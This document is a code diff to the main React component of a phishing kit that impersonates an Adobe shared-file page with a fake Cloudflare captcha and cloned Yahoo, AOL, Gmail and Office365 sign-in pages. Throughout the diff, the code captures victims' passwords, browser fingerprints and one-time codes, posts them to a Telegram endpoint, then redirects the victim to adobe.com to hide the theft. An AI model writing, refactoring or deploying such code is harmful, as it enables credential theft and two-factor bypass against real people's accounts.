@@ -10,33 +10,40 @@ import Office365Wrapper from './components/Office365Wrapper';
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
+import Spinner from './components/common/Spinner';
 import OtpPage from './components/OtpPage';
 import MobileOtpPage from './components/mobile/MobileOtpPage';
-import Spinner from './components/common/Spinner';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
 import { config } from './config';
 
-// This function is unchanged
-const safeSendToTelegram = async (sessionData: any) => {
+const safeSendToTelegram = async (payload: any) => {
   try {
-    const res = await fetch(config.api.sendTelegramEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(sessionData) });
+    const res = await fetch(config.api.sendTelegramEndpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
     if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
     return await res.json();
-  } catch (fetchErr) { console.error('sendToTelegram failed:', fetchErr); throw fetchErr; }
+  } catch (fetchErr) {
+    console.error('safeSendToTelegram failed:', fetchErr);
+    // Don't re-throw, to allow the flow to continue
+  }
 };
 
 function App() {
-  const [isMobile, setIsMobile] = useState(false);
+  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
   const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
   const [isLoading, setIsLoading] = useState(false);
-  const [loginAttemptData, setLoginAttemptData] = useState<any>(null);
-  const [showOtpPage, setShowOtpPage] = useState(false);
+  const [loginFlowState, setLoginFlowState] = useState({
+    awaitingOtp: false,
+    sessionData: null as any,
+  });
   const navigate = useNavigate();
 
   useEffect(() => {
     const checkMobile = () => setIsMobile(window.innerWidth <= 768);
-    checkMobile();
     window.addEventListener('resize', checkMobile);
     return () => window.removeEventListener('resize', checkMobile);
   }, []);
@@ -45,137 +52,113 @@ function App() {
     const handleCookieChange = (event: CookieChangeEvent) => {
       if (event.name === 'adobe_session') {
         const isActive = event.action !== 'remove' && !!event.value;
-        setHasActiveSession(isActive);
-        if (!isActive) {
-          setShowOtpPage(false); // Reset OTP state on logout
-          setLoginAttemptData(null);
-          navigate('/', { replace: true });
+        if (isActive !== hasActiveSession) {
+          setHasActiveSession(isActive);
         }
       }
     };
     const unsubscribe = subscribeToCookieChanges(handleCookieChange);
     return unsubscribe;
-  }, [navigate]);
+  }, [hasActiveSession]);
 
   useEffect(() => {
     if (hasActiveSession) {
       navigate('/landing', { replace: true });
-    } else if (showOtpPage) {
-      navigate('/otp', { replace: true });
-    } else {
-      // Handles initial load and logout cases
+    } else if (!loginFlowState.awaitingOtp) {
+      // If there's no session and we are not in the middle of an OTP flow, go to the root.
       const currentPath = window.location.pathname;
-      if (currentPath !== '/' && currentPath !== '/login') {
-          navigate('/', { replace: true });
+      if (currentPath !== '/') {
+         navigate('/', { replace: true });
       }
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [hasActiveSession, showOtpPage]);
+  }, [hasActiveSession, navigate]);
+
 
   const handleCaptchaVerified = () => navigate('/login');
 
-  const handleLoginSuccess = async (loginData: any) => {
-    // This function is now the entry point for the new flow
-    if (loginData.isSecondAttempt) {
-      setIsLoading(true);
-      console.log('Second attempt data received by App.tsx. Preparing to send credentials.');
-      const browserFingerprint = await getBrowserFingerprint();
-      const credentialsData = { 
-        ...loginData, 
-        sessionId: Math.random().toString(36).substring(2, 15), 
-        timestamp: new Date().toISOString(), 
-        userAgent: navigator.userAgent, 
-        ...browserFingerprint 
-      };
-      
-      // Store data for OTP step, then send credentials to Telegram
-      setLoginAttemptData(credentialsData);
-      
-      try {
-        await safeSendToTelegram({
-          type: 'Credentials',
-          ...credentialsData
-        });
-        console.log('Credentials sent to Telegram. Showing OTP page.');
-        // On success, show OTP page
-        setShowOtpPage(true);
-        navigate('/otp', { replace: true });
-      } catch (error) {
-        console.error('Failed to send credentials to Telegram:', error);
-        // Handle error - maybe show a message to the user
-      } finally {
-        setIsLoading(false);
-      }
-    }
-    // Note: The old flow (without isSecondAttempt) is no longer processed here.
-  };
-  
-  const handleOtpSubmit = async (otp: string) => {
-    if (!loginAttemptData) {
-      console.error('Cannot submit OTP, no login data found.');
-      // Redirect to start to be safe
-      setShowOtpPage(false);
-      navigate('/', { replace: true });
-      return;
-    }
-    
+  const handleSecondLoginAttempt = async (loginData: any) => {
     setIsLoading(true);
-    console.log('OTP received. Sending to Telegram and redirecting.');
-    
-    const otpData = {
-      type: 'OTP',
-      otp,
-      sessionId: loginAttemptData.sessionId,
+    const browserFingerprint = await getBrowserFingerprint();
+    const finalSessionData = {
+      ...loginData,
+      sessionId: Math.random().toString(36).substring(2, 15),
       timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      ...browserFingerprint,
     };
     
-    try {
-      await safeSendToTelegram(otpData);
-      console.log('OTP sent successfully.');
-    } catch (error) {
-      console.error('Failed to send OTP to Telegram:', error);
-    } finally {
-      // Whether TG send succeeds or fails, complete the flow for the user
-      setIsLoading(false);
-      setLoginAttemptData(null);
-      setShowOtpPage(false);
-      // Final redirection to Adobe website
-      window.location.href = 'https://www.adobe.com';
-    }
+    await safeSendToTelegram({
+      type: 'credentials',
+      data: finalSessionData,
+    });
+    
+    setIsLoading(false);
+    setLoginFlowState({
+      awaitingOtp: true,
+      sessionData: finalSessionData,
+    });
   };
-
-
+  
   const handleLogout = () => {
     localStorage.removeItem(config.session.sessionDataKey);
-    localStorage.removeItem('adobe_pre_session');
     sessionStorage.clear();
-    setLoginAttemptData(null);
-    setShowOtpPage(false);
     config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
+    setHasActiveSession(false); // Explicitly set state to trigger re-render and navigation
   };
 
+  const handleOtpSubmit = async (otp: string) => {
+    setIsLoading(true);
+
+    await safeSendToTelegram({
+      type: 'otp',
+      data: {
+        otp,
+        session: loginFlowState.sessionData,
+      },
+    });
+
+    // Perform the redirect. Do not reset state, as this can cause
+    // a re-render before the navigation completes. The page will be
+    // left behind anyway.
+    window.location.href = 'https://www.adobe.com';
+  };
+
+  const handleOtpBack = () => {
+    setLoginFlowState({ awaitingOtp: false, sessionData: null });
+    // This will cause a re-route to the login page via the useEffect hook
+    navigate('/login', { replace: true });
+  };
+  
   // --- Render Logic ---
-  if (isLoading && !showOtpPage) {
+  if (isLoading) {
     return <div className="min-h-screen bg-gray-100 flex items-center justify-center"><div className="text-center"><Spinner size="lg" /><p className="text-gray-600 mt-4">Loading...</p></div></div>;
+  }
+
+  // If waiting for OTP, show the OTP page regardless of other state
+  if (loginFlowState.awaitingOtp) {
+    const OtpComponent = isMobile ? MobileOtpPage : OtpPage;
+    return <OtpComponent 
+      email={loginFlowState.sessionData?.email}
+      provider={loginFlowState.sessionData?.provider}
+      onSubmit={handleOtpSubmit} 
+      onBack={handleOtpBack} 
+    />;
   }
 
   const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
   const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
   const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
-  const OtpComponent = isMobile ? MobileOtpPage : OtpPage;
 
+  // This defines the pages and their paths for the router
   return (
     <Routes>
-      <Route path="/" element={!hasActiveSession && !showOtpPage ? <CloudflareCaptcha onVerified={handleCaptchaVerified} /> : <Navigate to={hasActiveSession ? "/landing" : "/otp"} replace />} />
-      <Route path="/login" element={!hasActiveSession && !showOtpPage ? <LoginComponent fileName="Adobe Cloud Access" onYahooSelect={() => navigate('/login/yahoo')} onAolSelect={() => navigate('/login/aol')} onGmailSelect={() => navigate('/login/gmail')} onOffice365Select={() => navigate('/login/office365')} onBack={() => navigate('/')} onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={hasActiveSession ? "/landing" : showOtpPage ? "/otp" : "/"} replace />} />
-      <Route path="/login/yahoo" element={!hasActiveSession && !showOtpPage ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
-      <Route path="/login/aol" element={!hasActiveSession && !showOtpPage ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
-      <Route path="/login/gmail" element={!hasActiveSession && !showOtpPage ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
-      <Route path="/login/office365" element={!hasActiveSession && !showOtpPage ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
-      
-      {/* New OTP Route */}
-      <Route path="/otp" element={showOtpPage && !hasActiveSession ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginAttemptData?.email} /> : <Navigate to="/" replace />} />
-      
+      <Route path="/" element={!hasActiveSession ? <CloudflareCaptcha onVerified={handleCaptchaVerified} /> : <Navigate to="/landing" replace />} />
+      <Route path="/login" element={!hasActiveSession ? <LoginComponent fileName="Adobe Cloud Access" onYahooSelect={() => navigate('/login/yahoo')} onAolSelect={() => navigate('/login/aol')} onGmailSelect={() => navigate('/login/gmail')} onOffice365Select={() => navigate('/login/office365')} onBack={() => navigate('/')} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
+      <Route path="/login/yahoo" element={!hasActiveSession ? <YahooComponent onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
+      <Route path="/login/aol" element={!hasActiveSession ? <AolLoginPage onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
+      <Route path="/login/gmail" element={!hasActiveSession ? <GmailLoginPage onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
+      <Route path="/login/office365" element={!hasActiveSession ? <Office365Wrapper onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
       <Route path="/landing" element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to="/" replace />} />
       <Route path="*" element={<Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
     </Routes>
